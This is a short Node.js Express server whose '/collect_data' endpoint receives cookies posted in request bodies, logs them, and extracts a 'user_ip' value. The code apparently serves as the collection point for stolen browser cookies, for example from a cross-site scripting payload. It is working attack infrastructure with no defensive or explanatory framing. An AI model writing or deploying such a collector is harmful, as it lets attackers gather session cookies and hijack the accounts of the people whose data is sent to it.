const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware to parse JSON request bodies
app.use(bodyParser.json());

// Endpoint to collect cookies and other data
app.post('/collect_data', (req, res) => {
    const cookies = req.body.cookies;
    
    // Log the cookies to the console
    console.log('Received cookies:', cookies);

    // Extract the IP address from the cookies (if needed)
    const userIpMatch = cookies.match(/user_ip=([^;]+)/);
    if (userIpMatch) {
        const userIp = userIpMatch[1];
        console.log('User IP Address:', userIp);
    } else {
        console.log('IP address not found in cookies');
    }

    // Respond back to the client
    res.json({ status: 'success', message: 'Data received successfully!' });
});

// Start the server
app.listen(port, () => {
    console.log(`Server listening on http://10.0.1.33:${port}`);
});
